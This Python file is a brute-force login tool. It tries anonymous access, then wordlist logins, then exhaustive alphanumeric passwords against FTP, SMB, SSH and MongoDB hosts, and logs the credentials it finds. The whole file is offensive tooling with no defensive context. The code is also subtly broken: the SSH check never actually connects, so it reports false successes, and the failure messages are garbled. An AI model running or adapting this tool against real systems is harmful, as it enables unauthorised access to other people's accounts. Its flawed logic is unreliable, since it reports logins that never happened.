import string
import ftplib
from smb.SMBConnection import SMBConnection
from fabric import Connection, Config
from pymongo import MongoClient

def try_ftp_login(host, usernames, passwords, output_file):
    # First, try anonymous login
    try:
        ftp = ftplib.FTP(host)
        ftp.login("anonymous", "anonymous")
        ftp.quit()
        message = f"Anonymous login successful to {host} on port 21\n"
        print(message, end="")
        with open(output_file, "a") as file:
            file.write(message)
        return True, "anonymous", "anonymous"
    except ftplib.error_perm:
        pass

    # If anonymous login failed, try brute forcing
    for username in usernames:
        for password in passwords:
            try:
                ftp = ftplib.FTP(host)
                ftp.login(username, password)
                ftp.quit()
                return True, username, password
            except ftplib.error_perm:
                pass
    return False, None, None

def try_smb_login(host, usernames, passwords, output_file):
    # First, try anonymous login
    conn = SMBConnection("", "", 'client', 'server')
    try:
        success = conn.connect(host, 445)  # port 445 is typically used for SMB
        if success:
            message = f"Anonymous login successful to {host} on port 445\n"
            print(message, end="")
            with open(output_file, "a") as file:
                file.write(message)
            return True, "anonymous", ""
    except:
        pass
    finally:
        conn.close()

    # If anonymous login failed, try brute forcing
    for username in usernames:
        for password in passwords:
            conn = SMBConnection(username, password, 'client', 'server')
            try:
                success = conn.connect(host, 445)  # port 445 is typically used for SMB
                if success:
                    return True, username, password
            except:
                pass
            finally:
                conn.close()
    return False, None, None

def try_ssh_login(host, usernames, passwords, output_file):
    for username in usernames:
        for password in passwords:
            try:
                config = Config(overrides={'sudo': {'password': password}})
                conn = Connection(host, user=username, config=config)
                conn.close()
                return True, username, password
            except:
                pass
    return False, None, None

def try_mongodb_login(host, usernames, passwords, output_file):
    try:
        client = MongoClient(host)
        client.admin.command('ismaster')  # Check if the connection is successful / No Authen
        return True, "anonymous", "anonymous"
    except:
        pass
    return False, None, None

class BruteForcer:
    def __init__(self, usernames, passwords):
        self.usernames = usernames
        self.passwords = passwords

    def bruteforce_target(self, target, output_file):
        host, port = target
        successful_logins = []

        if port == 22:  # For SSH
            success, username, password = try_ssh_login(host, self.usernames, self.passwords, output_file)
        elif port == 445:  # For SMB
            success, username, password = try_smb_login(host, self.usernames, self.passwords, output_file)
        elif port in [20, 21]:  # For FTP
            success, username, password = try_ftp_login(host, self.usernames, self.passwords, output_file)
        elif port in [27017, 27018, 27019]:
            success, username, password = try_mongodb_login(host, self.usernames, self.passwords, output_file)
        else:
            print(f"Bruteforce not supported for port {port}")
            return

        if success:
            print(f"[YES] Login successful to {host} on port {port} with username '{username}' and password '{password}'")
            successful_logins.append((host, port, username, password))
            with open(output_file, 'a') as file:  # Open the output file
                # Write the successful login information to the file
                file.write(f"[YES] Login successful to {host} on port {port} with username '{username}' and password '{password}'\n")
        else:
            print(f"[YES] Lopgin failed to {host} on port {port} for all tested usernames and passwords")
            print(f"[NO] No connected to MongoDB {host} port {port} without authentication.\n")
            with open(output_file, 'a') as file:  # Open the output file
                # Write the failed login attempt to the file
                file.write(f"[NO] Login failed to {host} on port {port} for all tested usernames and passwords\n")
            
        return successful_logins

    def bruteforce_target_character(self, target, output_file):
        host, port = target
        successful_logins = []
        characters = string.ascii_letters + string.digits  # Use all alphanumeric characters
        max_length = 20  # Maximum password length

        brute_forcer_character = BruteForcerCharacter(characters, max_length)

        for password in brute_forcer_character.all_passwords():
            for username in self.usernames:
                success = False
                if port == 22:  # For SSH
                    success, _, _ = try_ssh_login(host, [username], [password], output_file)
                elif port == 445:  # For SMB
                    success, _, _ = try_smb_login(host, [username], [password], output_file)
                elif port in [20, 21]:  # For FTP
                    success, _, _ = try_ftp_login(host, [username], [password], output_file)
                elif port in [27017, 27018, 27019]:
                    success, _, _ = try_mongodb_login(host, [username], [password], output_file)

                if success:
                    print(f"[YES] Login successful to {host} on port {port} with username '{username}' and password '{password}'")
                    successful_logins.append((host, port, username, password))
                    return successful_logins  # Stop brute forcing if a successful login is found

        print(f"[NO] Login failed to {host} on port {port} for all tested usernames and passwords")
        return successful_logins

    
class BruteForcerCharacter:
    def __init__(self, characters, max_length):
        self.characters = characters
        self.max_length = max_length

    def generate_passwords(self, length):
        if length == 0:
            return
        for character in self.characters:
            if length == 1:
                yield character
            else:
                for password in self.generate_passwords(length - 1):
                    yield character + password

    def all_passwords(self):
        for length in range(1, self.max_length + 1):
            yield from self.generate_passwords(length)
